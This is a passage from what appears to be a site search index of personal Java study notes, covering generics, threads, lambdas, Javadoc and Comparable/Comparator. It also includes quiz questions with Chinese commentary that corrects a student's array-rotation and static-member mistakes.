namesListDiamond = new ArrayList&lt;&gt;(); // Java 7+\nMap&lt;String, List&lt;Integer&gt;&gt; complexMap = new HashMap&lt;&gt;();\n</code></pre></li> </ul> <ul> <li><code>var</code> Keyword (Java 10+): For local variable type inference, <code>var</code> can be used if the compiler can infer the type from the initializer expression on the right-hand side.     <pre><code>var messages = new ArrayList&lt;String&gt;(); // messages is ArrayList&lt;String&gt;\nvar userScores = new HashMap&lt;String, Integer&gt;(); // userScores is HashMap&lt;String, Integer&gt;\n\n// Combining var with the diamond operator:\nvar inferredObjectList = new ArrayList&lt;&gt;(); // Type of inferredObjectList is ArrayList&lt;Object&gt;\n                                          // because no type info for elements on the right.\nvar specificStringList = new ArrayList&lt;String&gt;(); // Type is ArrayList&lt;String&gt;\n</code></pre>     When using <code>var</code>, ensure the right-hand side provides enough information for the desired type, or be aware it might infer a more general type like <code>Object</code>.</li> </ul> <p>Example: Generic Method with Type Inference Consider a generic method: <pre><code>class GenericUtil {\n    static &lt;T&gt; ArrayList&lt;T&gt; selectFromArray(ArrayList&lt;T&gt; data, int[] indices) {\n        // Explicit type for 'result' with diamond operator\n        ArrayList&lt;T&gt; result = new ArrayList&lt;&gt;();\n\n        // Alternatively, using var (Java 10+):\n        // var result = new ArrayList&lt;T&gt;(); // T must be inferable for the list elements\n\n        for (int index : indices) {\n            if (index &gt;= 0 &amp;&amp; index &lt; data.size()) {\n                result.add(data.get(index));\n            }\n        }\n        return result;\n    }\n    public static void main(String[] args) {\n        var numbers = new ArrayList&lt;Integer&gt;();\n        numbers.add(10); numbers.add(20); numbers.add(30);\n        int[] selection = {0, 2};\n        ArrayList&lt;Integer&gt; selectedNumbers = selectFromArray(numbers, selection);\n        System.out.println(selectedNumbers); // [10, 30]\n    }\n}\n</code></pre></p>"},{"location":"cs/java/basics/concept/#13-solid-principles","title":"13. SOLID Principles","text":"<p>SOLID is an acronym for five design principles intended to make software designs more understandable, flexible, and maintainable.</p> Principle Description Single Responsibility Principle (SRP) A class should have only one reason to change, meaning it should have only one job or responsibility. Open/Closed Principle (OCP) Software entities (classes, modules, functions) should be open for extension but closed for modification. Liskov Substitution Principle (LSP) Subtypes must be substitutable for their base types without altering the correctness of the program. Interface Segregation Principle (ISP) Clients should not be forced to depend on interfaces they do not use. Prefer smaller, specific interfaces. Dependency Inversion Principle (DIP) High-level modules should not depend on low-level modules. Both should depend on abstractions. Abstractions should not depend on details; details should depend on abstractions. <p>Example (Illustrating OCP): <pre><code>// Violates OCP: Modifying AreaCalculator for new shapes\n/*\nclass AreaCalculator {\n    public double calculate(Object shape) {\n        if (shape instanceof Circle) return Math.PI * ((Circle)shape).radius * ((Circle)shape).radius;\n        if (shape instanceof Square) return ((Square)shape).side * ((Square)shape).side;\n        return 0;\n    }\n}\n*/\n\n// Obeys OCP: Extend by adding new Shape implementations\ninterface Shape { double area(); }\nclass CircleShape implements Shape {\n    double radius; CircleShape(double r) {radius=r;}\n    public double area() { return Math.PI * radius * radius; }\n}\nclass SquareShape implements Shape {\n    double side; SquareShape(double s) {side=s;}\n    public double area() { return side * side; }\n}\n// To add Triangle, just create TriangleShape implements Shape.\n</code></pre></p>"},{"location":"cs/java/basics/concept/#14-multi-threading","title":"14. Multi-Threading","text":"<p>Multi-threading allows concurrent execution of two or more parts of a program for maximum CPU utilization, responsiveness, and efficiency.</p>"},{"location":"cs/java/basics/concept/#141-creating-threads","title":"14.1. Creating Threads","text":"<p>There are two main ways to create a thread:</p> <ol> <li> <p>Extending the <code>Thread</code> Class:</p> <ul> <li>Create a class that extends <code>java.lang.Thread</code>.</li> <li>Override its <code>run()</code> method.</li> <li>Create an instance of the class and call its <code>start()</code> method.</li> </ul> <pre><code>class MyThread extends Thread {\n    private int id;\n    public MyThread(int id) { this.id = id; }\n    @Override\n    public void run() {\n        System.out.println(\"Thread \" + id + \" running\");\n    }\n}\n// To run: new MyThread(1).start();\n</code></pre> </li> <li> <p>Implementing the <code>Runnable</code> Interface:</p> <ul> <li>Create a class that implements <code>java.lang.Runnable</code>.</li> <li>Implement the <code>run()</code> method.</li> <li>Create an instance of the class, pass it to a <code>Thread</code> object's constructor, and call <code>start()</code> on the <code>Thread</code> object.</li> <li>This is generally preferred as it allows the class to extend other classes.</li> </ul> <pre><code>class MyRunnable implements Runnable {\n    private int id;\n    public MyRunnable(int id) { this.id = id; }\n    @Override\n    public void run() {\n        System.out.println(\"Runnable \" + id + \" running\");\n    }\n}\n// To run: new Thread(new MyRunnable(1)).start();\n</code></pre> </li> </ol>"},{"location":"cs/java/basics/concept/#142-the-join-method","title":"14.2. The <code>join()</code> Method","text":"<p>The <code>join()</code> method waits for a thread to die (finish its execution). - When <code>t.join()</code> is called, the current thread will pause its execution until thread <code>t</code> has completed. - Throws <code>InterruptedException</code> if the waiting thread is interrupted.</p> <pre><code>public class JoinExample {\n    public static void main(String[] args) throws InterruptedException {\n        Thread t1 = new Thread(() -&gt; {\n            System.out.println(\"T1 started\");\n            try { Thread.sleep(100); } catch (InterruptedException e) {}\n            System.out.println(\"T1 finished\");\n        });\n        t1.start();\n        t1.join(); // Main thread waits for t1 to finish\n        System.out.println(\"Main thread continues after T1\");\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/concept/#143-race-conditions","title":"14.3. Race Conditions","text":"<p>A race condition occurs when multiple threads access shared data concurrently, and the outcome depends on the particular order in which operations are performed. This can lead to unpredictable results.</p> <p>Example: <pre><code>class Counter {\n    private int count = 0;\n    public void increment() { count++; } // Not atomic\n    public int getCount() { return count; }\n}\n// If two threads call increment() on the same Counter instance,\n// the final count might be less than expected due to lost updates.\n// E.g., T1 reads count (0), T2 reads count (0), T1 writes (1), T2 writes (1). Expected: 2.\n</code></pre></p>"},{"location":"cs/java/basics/concept/#144-synchronized-keyword","title":"14.4. <code>synchronized</code> Keyword","text":"<p>Java's <code>synchronized</code> keyword provides a locking mechanism to control access to shared resources, preventing race conditions. - Synchronized Methods: When a synchronized method is called, the thread acquires an intrinsic lock on the object (or class if static method).   <pre><code>class SafeCounter {\n    private int count = 0;\n    public synchronized void increment() { count++; }\n    public int getCount() { return count; }\n}\n</code></pre> - Synchronized Blocks: Allows synchronization on any object, for a smaller section of code.   <pre><code>public class SyncBlockExample {\n    private Object lock = new Object();\n    public void performAction() {\n        // ... non-critical section ...\n        synchronized (lock) {\n            // Critical section: only one thread at a time\n        }\n        // ... non-critical section ...\n    }\n}\n</code></pre> Only one thread can hold the lock on a given monitor object at a time.</p>"},{"location":"cs/java/basics/concept/#145-deadlock","title":"14.5. Deadlock","text":"<p>Deadlock is a situation where two or more threads are blocked forever, each waiting for the other to release a resource. - Typically occurs when multiple threads need the same set of locks but acquire them in different orders.</p> <p>Example Scenario: Thread A locks Resource1, then tries to lock Resource2. Thread B locks Resource2, then tries to lock Resource1.</p> <p>Prevention: - Acquire locks in a fixed, global order. - Avoid holding multiple locks if possible. - Use timeouts for lock acquisition.</p>"},{"location":"cs/java/basics/concept/#146-inter-thread-communication","title":"14.6. Inter-thread Communication","text":"<p>Threads can communicate using <code>wait()</code>, <code>notify()</code>, and <code>notifyAll()</code> methods, which are part of <code>java.lang.Object</code>. These methods must be called from within a synchronized context (on the object whose lock is held).</p> <ul> <li><code>wait()</code>: Causes the current thread to release the lock and wait until another thread invokes <code>notify()</code> or <code>notifyAll()</code> on the same object, or a timeout occurs.</li> <li><code>notify()</code>: Wakes up a single thread that is waiting on this object's monitor. If multiple threads are waiting, one is chosen arbitrarily.</li> <li><code>notifyAll()</code>: Wakes up all threads that are waiting on this object's monitor.</li> </ul> <p>Example: Producer-Consumer <pre><code>class SharedBuffer {\n    private String data;\n    private boolean available = false;\n\n    public synchronized void produce(String item) throws InterruptedException {\n        while (available) wait(); // Wait if buffer is full\n        data = item;\n        System.out.println(\"Produced: \" + item);\n        available = true;\n        notify(); // Notify consumer\n    }\n    public synchronized String consume() throws InterruptedException {\n        while (!available) wait(); // Wait if buffer is empty\n        System.out.println(\"Consumed: \" + data);\n        String item = data;\n        available = false;\n        notify(); // Notify producer\n        return item;\n    }\n}\n</code></pre></p>"},{"location":"cs/java/basics/concept/#15-anonymous-classes","title":"15. Anonymous Classes","text":"<p>An anonymous class is a class without a name, defined and instantiated in a single expression. They are useful for creating one-off objects, typically for implementing an interface or extending a class with a small amount of overriding logic.</p> <ul> <li>Syntax: <code>new SuperType(constructor_args) { // class body }</code></li> <li><code>SuperType</code> can be an interface (then it implements it) or a class (then it extends it).</li> </ul> <p>Example (Implementing an Interface): <pre><code>interface Greeter { void greet(); }\n\npublic class AnonymousDemo {\n    public static void main(String[] args) {\n        // Using an anonymous class to implement Greeter\n        Greeter englishGreeter = new Greeter() {\n            @Override\n            public void greet() {\n                System.out.println(\"Hello!\");\n            }\n        };\n        englishGreeter.greet(); // Output: Hello!\n\n        // Often used with event listeners or comparators\n        java.util.Arrays.sort(new String[]{\"c\",\"a\",\"b\"}, new java.util.Comparator&lt;String&gt;() {\n            public int compare(String s1, String s2) {\n                return s1.compareTo(s2);\n            }\n        });\n    }\n}\n</code></pre> - Anonymous classes can access members of their enclosing class and effectively final local variables.</p>"},{"location":"cs/java/basics/concept/#16-lambda-expressions","title":"16. Lambda Expressions","text":"<p>Lambda expressions provide a concise way to represent an instance of a functional interface (an interface with a single abstract method). They are essentially anonymous functions.</p> <ul> <li>Syntax:</li> <li><code>(parameters) -&gt; expression</code></li> <li><code>(parameters) -&gt; { statements; }</code></li> <li><code>() -&gt; expression</code> (no parameters)</li> </ul> <p>Key Features: - Type Inference: Compiler can often infer parameter types. - Conciseness: Reduces boilerplate code compared to anonymous classes. - Functional Interfaces: Can only be used with functional interfaces (e.g., <code>Runnable</code>, <code>Comparator</code>, <code>ActionListener</code>). <code>@FunctionalInterface</code> annotation can be used.</p> <p>Example (Replacing Anonymous Class with Lambda): <pre><code>import java.util.Arrays;\nimport java.util.Comparator;\n\npublic class LambdaDemo {\n    public static void main(String[] args) {\n        String[] names = {\"Charlie\", \"Alice\", \"Bob\"};\n\n        // Using an anonymous class for Comparator\n        Comparator&lt;String&gt; anonComp = new Comparator&lt;String&gt;() {\n            @Override\n            public int compare(String s1, String s2) {\n                return s1.compareTo(s2);\n            }\n        };\n        Arrays.sort(names, anonComp); // Sorts with anonymous class\n\n        // Using a lambda expression for Comparator\n        // Arrays.sort(names, (s1, s2) -&gt; s1.compareTo(s2)); // Sorts with lambda\n        // For clarity, assign to variable first:\n        Comparator&lt;String&gt; lambdaComp = (s1, s2) -&gt; s1.compareTo(s2);\n        Arrays.sort(names, lambdaComp);\n        System.out.println(Arrays.toString(names)); // [Alice, Bob, Charlie]\n    }\n}\n</code></pre> - If a lambda body has a single expression, its result is implicitly returned. - If it has multiple statements, they must be enclosed in <code>{}</code> and <code>return</code> must be explicit if a value is returned.</p>"},{"location":"cs/java/basics/concept/#17-javadoc","title":"17. Javadoc","text":"<p>Javadoc is a documentation generator created by Sun Microsystems for the Java language (now Oracle Corporation) for generating API documentation in HTML format from Java source code.</p> <ul> <li>Comments: Javadoc comments start with <code>/**</code> and end with <code>*/</code>.</li> <li>Placement: Placed immediately before class, interface, method, or field declarations.</li> <li>Tags: Special keywords prefixed with <code>@</code> to provide specific information.</li> </ul> <p>Common Javadoc Tags: | Tag           | Description                                       | Context         | |---------------|---------------------------------------------------|-----------------| | <code>@author</code>     | Author of the code.                               | Class, Interface| | <code>@version</code>    | Version of the code.                              | Class, Interface| | <code>@param</code>      | Describes a method parameter.                     | Method          | | <code>@return</code>     | Describes the return value of a method.           | Method          | | <code>@throws</code>     | Describes an exception that a method may throw.   | Method          | | <code>@see</code>        | Creates a link to other Javadoc documentation.    | All             | | <code>@since</code>      | Indicates when the feature was introduced.        | All             | | <code>@deprecated</code> | Marks a feature as deprecated.                    | All             |</p> <p>Example: <pre><code>/**\n * Represents a simple calculator.\n * @author Copilot\n * @version 1.0\n */\npublic class Calculator {\n    /**\n     * Adds two integers.\n     *\n     * @param a The first integer.\n     * @param b The second integer.\n     * @return The sum of a and b.\n     */\n    public int add(int a, int b) {\n        return a + b;\n    }\n}\n</code></pre></p> <p>Generating Javadoc: Use the <code>javadoc</code> command-line tool: <code>javadoc [options] [packagenames] [sourcefiles]</code> Example: <code>javadoc -d doc_output com.example.MyClass.java</code> This generates HTML documentation in the <code>doc_output</code> directory.</p>"},{"location":"cs/java/basics/concept/#18-comparable-vs-comparator","title":"18. Comparable vs Comparator","text":"Feature Comparable Comparator Purpose Natural ordering of objects. Custom ordering of objects. Method <code>int compareTo(T o)</code> <code>int compare(T o1, T o2)</code> Implementation Class implements <code>Comparable&lt;T&gt;</code>. Separate class implements <code>Comparator&lt;T&gt;</code>. Sorting <code>Collections.sort(list)</code> uses <code>compareTo</code>. <code>Collections.sort(list, comparator)</code> uses <code>compare</code>. <p>Example: Comparable <pre><code>class Student implements Comparable&lt;Student&gt; {\n    int id; String name;\n    // Constructor...\n    public int compareTo(Student s) {\n        return this.name.compareTo(s.name); // Sort by name\n    }\n}\n</code></pre></p> <p>Example: Comparator <pre><code>class Student {\n    int id; String name;\n    // Constructor...\n}\nclass SortById implements Comparator&lt;Student&gt; {\n    public int compare(Student s1, Student s2) {\n        return s1.id - s2.id; // Sort by id\n    }\n}\n</code></pre> Note on <code>Double.compareTo()</code> (inspired by <code>t2.md</code> Q1): The <code>compareTo</code> method in wrapper classes like <code>Double</code> (and other <code>Number</code> subclasses that implement <code>Comparable</code>) follows the standard <code>Comparable</code> contract: -   <code>x.compareTo(y)</code> returns:     -   <code>0</code> if <code>x</code> is numerically equal to <code>y</code>.     -   A value less than <code>0</code> if <code>x</code> is numerically less than <code>y</code>.     -   A value greater than <code>0</code> if <code>x</code> is numerically greater than <code>y</code>. This is essential for sorting numerical data or using these objects in ordered collections like <code>TreeSet</code> or <code>TreeMap</code>.</p> <pre><code>// Example: Finding the minimum value in an array of Doubles\npublic class MinDoubleFinder {\n    static Double findMinimum(Double[] values) {\n        if (values == null || values.length == 0) {\n            throw new IllegalArgumentException(\"Input array cannot be null or empty.\");\n        }\n        Double minimumValue = values[0];\n        for (int i = 1; i &lt; values.length; i++) {\n            if (values[i] != null &amp;&amp; minimumValue.compareTo(values[i]) &gt; 0) {\n                // if minimumValue is greater than values[i]\n                minimumValue = values[i]; // update minimumValue to the smaller value\n            }\n        }\n        return minimumValue;\n    }\n    public static void main(String[] args) {\n        Double[] data = {3.14, 1.618, 2.718, 0.577};\n        System.out.println(\"Minimum: \" + findMinimum(data)); // Minimum: 0.577\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/t1/","title":"1.0 T1","text":""},{"location":"cs/java/basics/t1/#q9","title":"Q9","text":"<p>What does the following program print?</p> <pre><code>class Person {\n    public String status() { return \"Okay\"; }\n}\n\nclass Student extends Person {\n    public String status() { return \"Stressed\"; }\n}\n\nclass Academic extends Person {\n    public String status() { return \"Busy\"; }\n}\n\nclass Lecturer extends Academic { }\n\npublic class People {\n    public static void main(String[] args) {    \n        Person[] people = {new Person(), new Student(), new Academic(), new Lecturer()};\n        for (int i = 0; i &lt; people.length; i++) {\n            Person person = people[i];\n            System.out.print(person.status() + \" \");\n        }\n    }\n}\n</code></pre> <p>\u8fd9\u9053\u9898\u6b7b\u7684\u5f88\u51a4\u6789\uff0c\u662f\u5403\u4e86\u6ca1\u6709\u68c0\u67e5\u7684\u4e8f\uff0c\u518d\u770b\u4e00\u904d\u5b9e\u9645\u4e0a\u5c31\u662f Okay Stressed Busy Busy, \u6700\u540e\u4e00\u4e2a\u7c7b\u5176\u7ee7\u627f\u7684\u5b9e\u9645\u4e0a\u662f Academic</p>"},{"location":"cs/java/basics/t1/#q10","title":"Q10","text":"<p>Which of the following would be reasonable as an example of a subclass relationship?</p> <p>There may be multiple correct answers. Select all of them.</p> <p>Potato is a subclass of Vegetable</p> <p>Building is a subclass of Skyscraper</p> <p>House is a subclass of Building</p> <p>Potato is a subclass of Building</p> <p>Window is a subclass of House</p> <p>\u8fd9\u9053\u9898\u6211\u9009\u62e9\u4e86\u4ee5\u4e0a\u4e09\u4e2a\uff0c\u9519\u70b9\u5728\u4e8e\u6ca1\u6709\u641e\u6e05\u695a Class \u4e4b\u95f4\u7684\u5173\u7cfb\u3002\u8bc4\u8bba\u5199\u9053\uff1a</p> <p>\u8bb0\u4f4f\uff0c\u201cX \u662f Y \u7684\u5b50\u7c7b\u201d \u610f\u5473\u7740 \u201cX \u662f Y\u201d</p> <p>Window \u53ea\u662f House \u5176\u4e2d\u7684\u4e00\u4e2a\u90e8\u5206\uff0c\u672c\u8eab\u5b9e\u9645\u4e0a\u5e76\u4e0d\u662f\u4e00\u4e2a\u7c7b / \u623f\u5b50</p>"},{"location":"cs/java/basics/t1/#q11","title":"Q11","text":"<pre><code>public class Counter {\n    private int count;\n\n    public int getCount() { return count; }\n\n    public void increment() { count += 1; }\n\n    public void decrement() { count -= 1; }\n\n    public static void main(String[] args) {\n        Counter.increment();\n        decrement();\n        increment();\n        System.out.println(Counter.getCount());\n    }\n}\n</code></pre> <p>Which members of the <code>Counter</code> class need to be made <code>static</code> in order for the code to compile successfully?</p> <p>There may be multiple correct answers. Select all of them</p> <p>\u9759\u6001\u6210\u5458 (\u7528 <code>static</code> \u4fee\u9970\u7684\u53d8\u91cf\u6216\u65b9\u6cd5): \u5b83\u4eec\u5c5e\u4e8e\u7c7b\u672c\u8eab\uff0c\u800c\u4e0d\u662f\u5c5e\u4e8e\u7c7b\u7684\u67d0\u4e2a\u7279\u5b9a\u7684\u5bf9\u8c61 (\u5b9e\u4f8b)\u3002\u65e0\u8bba\u521b\u5efa\u591a\u5c11\u4e2a\u7c7b\u7684\u5bf9\u8c61\uff0c\u9759\u6001\u6210\u5458\u53ea\u6709\u4e00\u4efd\uff0c\u88ab\u6240\u6709\u5bf9\u8c61\u5171\u4eab\u3002\u9759\u6001\u65b9\u6cd5\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u7c7b\u540d\u8c03\u7528 (<code>ClassName.staticMethod()</code>)\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5bf9\u8c61\u8c03\u7528 (<code>object.staticMethod()</code>)\uff0c\u4f46\u901a\u5e38\u63a8\u8350\u4f7f\u7528\u7c7b\u540d\u8c03\u7528\u3002</p> <p>\u975e\u9759\u6001\u6210\u5458 (\u6ca1\u6709\u7528 <code>static</code> \u4fee\u9970\u7684\u53d8\u91cf\u6216\u65b9\u6cd5): \u5b83\u4eec\u5c5e\u4e8e\u7c7b\u7684\u5bf9\u8c61 (\u5b9e\u4f8b)\u3002\u6bcf\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8fd9\u4e2a\u5bf9\u8c61\u5c31\u6709\u4e00\u4efd\u81ea\u5df1\u7684\u975e\u9759\u6001\u6210\u5458\u53d8\u91cf\u548c\u975e\u9759\u6001\u65b9\u6cd5\u3002\u4f60\u9700\u8981\u5148\u521b\u5efa\u7c7b\u7684\u5bf9\u8c61\uff0c\u7136\u540e\u901a\u8fc7\u5bf9\u8c61\u6765\u8c03\u7528\u8fd9\u4e9b\u65b9\u6cd5 (<code>object.instanceMethod()</code>) \u6216\u8bbf\u95ee\u53d8\u91cf (<code>object.instanceVariable</code>)\u3002</p> <p>Java \u7a0b\u5e8f\u7684\u5165\u53e3\u70b9\u662f <code>public static void main(String[] args)</code>\u3002<code>main</code> \u65b9\u6cd5\u5fc5\u987b\u662f <code>static</code> \u7684\uff0c\u56e0\u4e3a Java \u865a\u62df\u673a (JVM) \u5728\u542f\u52a8\u7a0b\u5e8f\u65f6\uff0c\u4e0d\u9700\u8981\u521b\u5efa\u7c7b\u7684\u5bf9\u8c61\u5c31\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528 <code>main</code> \u65b9\u6cd5\u6765\u6267\u884c\u7a0b\u5e8f\u3002</p> <p>\u9759\u6001\u65b9\u6cd5 (<code>main</code>) \u5728\u6267\u884c\u65f6\uff0c\u6ca1\u6709\u4e00\u4e2a\u7279\u5b9a\u7684 <code>Counter</code> \u5bf9\u8c61\u4e0e\u4e4b\u5173\u8054\uff08\u6ca1\u6709 <code>this</code> \u6307\u9488\u6307\u5411\u4e00\u4e2a\u5bf9\u8c61\uff09\u3002\u5b83\u4e0d\u77e5\u9053\u5e94\u8be5\u5bf9\u54ea\u4e2a <code>Counter</code> \u5bf9\u8c61\u7684 <code>count</code> \u8fdb\u884c\u64cd\u4f5c\u6216\u83b7\u53d6\u3002</p> <p>\u6240\u4ee5\u9700\u8981\u628a\u6240\u6709\u7684 function \u4ee5\u53ca\u53d8\u91cf\u5168\u90e8\u90fd\u9759\u6001\u5316</p> <pre><code>public class Counter {\n    private static int count; // \u4f7f count \u6210\u4e3a\u9759\u6001\u53d8\u91cf\n\n    public static int getCount() { return count; } // \u4f7f\u65b9\u6cd5\u6210\u4e3a\u9759\u6001\u7684\n\n    public static void increment() { count += 1; } // \u4f7f\u65b9\u6cd5\u6210\u4e3a\u9759\u6001\u7684\n\n    public static void decrement() { count -= 1; } // \u4f7f\u65b9\u6cd5\u6210\u4e3a\u9759\u6001\u7684\n\n    public static void main(String[] args) {\n        // \u73b0\u5728\u53ef\u4ee5\u5728\u9759\u6001\u7684 main \u65b9\u6cd5\u4e2d\u76f4\u63a5\u8c03\u7528\u9759\u6001\u65b9\u6cd5\u4e86\n        Counter.increment();\n        decrement();\n        increment();\n        System.out.println(Counter.getCount());\n    }\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u5728\u7b2c 12 \u884c\u6307\u5b9a\u76f4\u63a5\u7528 class \u6784\u9020\u51fd\u6570\u8c03\u7528\u540e\u540e\u7eed\u9ed8\u8ba4\u4f7f\u7528\u8be5\u65b9\u6cd5\u4f46\u4e0d\u89c4\u8303</p> <p>count</p> <p>getCount()</p> <p>increment()</p> <p>decrement()</p>"},{"location":"cs/java/basics/t1/#q12","title":"Q12","text":"<pre><code>static void rotate(int[] arr) {\n    // Your code here\n}\n\nstatic int[] rotated(int[] arr) {\n    // Your code here\n}\n</code></pre> <p>Both of these methods should rotate the elements in the given array one space to the left (with the first element wrapping around to the end of the array). However, <code>rotate(x)</code> should rotate the elements in place within <code>x</code>, while <code>rotated(x)</code> should return a rotated version of <code>x</code> without modifying the contents of <code>x</code> itself.</p> <p>For Example:</p> <pre><code>int[] x = {2, 0, 0, 5};\nrotate(x);\n// x should at this point contain {0, 0, 5, 2}\n</code></pre> <p>You may assume for both methods that the given array is non-empty.</p>"},{"location":"cs/java/basics/t1/#rotate","title":"rotate","text":"<pre><code>static void rotate(int[] arr) {\n    last_num = arr.length - 1;\n    arr[last_num] = arr[0];\n    for (int i = 0; i &lt; arr.length - 1, i++){\n        arr[i] = arr[i + 1];\n    }\n}\n</code></pre> <p>\u6700\u540e\u4e00\u4f4d\u53d8\u6210\u7b2c\u4e00\u4f4d\uff0c\u6240\u6709\u5176\u4f59\u6570\u503c\u5168\u90e8\u5f80\u5de6\u8fb9\u79fb\u52a8\u4e00\u4f4d\u3002</p> <p>\u8be5\u65b9\u6cd5\u76ee\u6807\u662f\u76f4\u63a5\u65cb\u8f6c\u539f\u59cb\u6570\u7ec4\uff0c\u4f46\u662f\u903b\u8f91\u9519\u8bef\u5982\u4e0b\uff1a</p> <ol> <li>\u7b2c\u4e8c\u884c\u6ca1\u6709\u58f0\u660e <code>int</code> \u7c7b\u578b</li> <li>\u7b2c\u4e09\u884c\u628a\u7b2c\u4e00\u4e2a\u6570\u7ec4\u4e2d\u7684\u6570\u5b57\u653e\u5728\u6700\u540e\u7684\u6570\u7ec4\u4f4d\u7f6e\u4e0a</li> <li>\u8fd9\u6837\u505a\u4f1a\u76f4\u63a5\u8986\u76d6\u6389\u6700\u540e\u4e00\u4e2a\u4f4d\u7f6e\u4e0a\u539f\u672c\u7684\u6570\u503c\u4e22\u5931\u4e86</li> <li>\u56e0\u6b64\u6b63\u786e\u601d\u8def\u662f\u5728\u8986\u76d6\u6389\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u4e4b\u524d\u5c31\u8981\u628a\u539f\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u4e34\u65f6\u4fdd\u5b58</li> </ol> <p>\u6240\u4ee5\u9996\u5148\u6539\u6b63\u8bed\u6cd5\u9519\u8bef\u7136\u540e\u6539\u6b63\u7b97\u6cd5</p> <pre><code>public class Main {\n    static void rotate(int[] arr) {\n        // int first = arr[0];\n        // int last = arr[arr.length - 1];\n\n        for (int i = 0; i &lt; arr.length - 1; i++) {\n            arr[i] = arr[i + 1];\n        }\n    }\n\n    public static void main(String[] args) {\n        int[] arr = { 1, 2, 3, 4, 5 };\n        rotate(arr);\n        for (int i : arr) {\n            System.out.println(i);\n        }\n    }\n\n}\n</code></pre> <p>\u73b0\u5728\u7b97\u6cd5\u8fd8\u662f\u6709\u5c0f\u95ee\u9898\uff0c\u6d4b\u8bd5\u53d1\u73b0\u6838\u5fc3\u7b97\u6cd5\u601d\u8def\u6ca1\u95ee\u9898\uff0c\u8f93\u51fa\u4e3a</p> <pre><code>2\n3\n4\n5\n5\n</code></pre> <p>\u8fd9\u6837\u4ee5\u6765\u5c31\u597d\u529e\u4e86\uff0c\u5728\u5f00\u59cb\u4e4b\u524d\u8bb0\u4f4f\u7b2c\u4e00\u4e2a\u5185\u5bb9\u540e\u5728\u6392\u5e8f\u7ed3\u675f\u540e\u66ff\u6362\u5230\u672b\u5c3e\u5373\u53ef</p> <pre><code>public class Main {\n    static void rotate(int[] arr) {\n        int first = arr[0];\n\n        for (int i = 0; i &lt; arr.length - 1; i++) {\n            arr[i] = arr[i + 1];\n        }\n        arr[arr.length - 1] = first;\n    }\n\n    public static void main(String[] args) {\n        int[] arr = { 1, 2, 3, 4, 5 };\n        rotate(arr);\n        for (int i : arr) {\n            System.out.println(i);\n        }\n    }\n\n}\n</code></pre> <p>\u5b8c\u7f8e\u89e3\u51b3\uff0c<code>23451</code></p>"},{"location":"cs/java/basics/t1/#rotated","title":"rotated","text":"<pre><code>int[] y = rotated(x);\n// x should still be {0, 0, 5, 2}, but\n// y should now be {0, 5, 2, 0}\n</code></pre> <pre><code>static int[] rotated(int[] arr) {\n    int[] result = new int[arr.length];\n    last_num = arr.length - 1;\n    result[last_num] = arr[0];\n    for (int i = 1; i &lt; arr.length, i++){\n        int j = 0;\n        result[j] = arr[i];\n        j++;\n    }\n    return result;\n}\n</code></pre> <p>\u7ed3\u679c\u5c31\u662f\u4ec0\u4e48\u4e5f\u6ca1\u53d8</p> <p></p> <p>\u7531\u4e8e\u591a\u51fa\u6765\u4e00\u7ec4\u6570\u7ec4\uff0c\u53ef\u4ee5\u76f4\u63a5\u7a0d\u5fae\u4fee\u6539\u4e0b rotate \u51fd\u6570\u5373\u53ef</p> <pre><code>public class Main {\n    static int[] rotated(int[] arr) {\n        int first = arr[0];\n        int[] result = new int[arr.length];\n\n        for (int i = 0; i &lt; arr.length - 1; i++) {\n            result[i] = arr[i + 1];\n        }\n        result[arr.length - 1] = first;\n        return result;\n    }\n\n    public static void main(String[] args) {\n        int[] arr = { 1, 2, 3, 4, 5 };\n        int[] result = rotated(arr);\n        for (int i : result) {\n            System.out.println(i);\n        }\n    }\n}\n</code></pre> <p><code>rotated</code>\u65b9\u6cd5\u4e5f\u662f\u9759\u6001\u7684\uff0c\u8fd9\u4f7f\u5f97\u5b83\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4ece<code>main</code>\u65b9\u6cd5\u4e2d\u8c03\u7528</p>"},{"location":"cs/java/basics/t1/#q13","title":"Q13","text":"<pre><code>class BoolExpr {\n    public void describe() {\n        System.out.print(\"unknown\");\n    } // To be overridden\n\n    public boolean evaluate() {\n        return false;\n    } // To be overridden\n}\n\nclass BoolVal extends BoolExpr {\n    boolean val;\n\n    public BoolVal(boolean val) {\n        this.val = val; // this \u5199\u6cd5\u662f\u4e3a\u4e86\u8c03\u7528\u5b89\u5168\u8d77\u89c1\n    }\n\n    @Override\n    public void describe() {\n        System.out.print(val);\n    }\n\n    @Override\n    public boolean evaluate() {\n        return val;\n    }\n}\n</code></pre> <p>Write two new classes</p> <p><code>BoolNot</code> must have a constructor that is able to take any single BoolExpr, and represents the negation of that expression: <code>!expr</code></p> <p><code>BoolAnd</code> must have a constructor that is able to take any pair of BoolExprs, and represents the logical and of those expressions: <code>(lhs &amp;&amp; rhs)</code></p> <pre><code>BoolExpr expr = new BoolAnd(new BoolVal(true), new BoolVal(false));\n// \u8fd9\u91cc\u4f7f\u7528\u4e24\u4e2a BoolVal \u7684\u53c2\u6570\u4f20\u53c2\u7ed9 BoolAnd\nexpr = new BoolNot(expr); // \u518d\u4f20\u7ed9 BoolNot \u8fdb\u884c ! \u64cd\u4f5c\nexpr = new BoolAnd(new BoolVal(true), expr); // true \u4e0e\u4e0a\u4e00\u4e2a expr \u8fdb\u884c &amp;&amp; \u64cd\u4f5c\nexpr.describe(); // \u63cf\u8ff0\u4e00\u4e0b\u73b0\u5728\u8fd9\u4e2a expr \u662f\u5565\u6837\u7684\nSystem.out.println(); // \u6362\u884c\nSystem.out.println(\"= \" + expr.evaluate()); // \u8ba1\u7b97\u6700\u7ec8\u7ed3\u679c\n</code></pre> <p>\u5199\u5b8c\u540e\u4f7f\u7528\u4e0a\u8ff0\u7a0b\u5e8f\u6d4b\u8bd5\u6267\u884c\u7684\u7ed3\u679c\u5e94\u8be5\u662f\uff1a</p> <pre><code>(true &amp;&amp; !(true &amp;&amp; false))\n= true\n</code></pre>"},{"location":"cs/java/basics/t1/#boolnot","title":"BoolNot","text":"<pre><code>class BoolNot extends BoolExpr {\n    BoolExpr expr; // 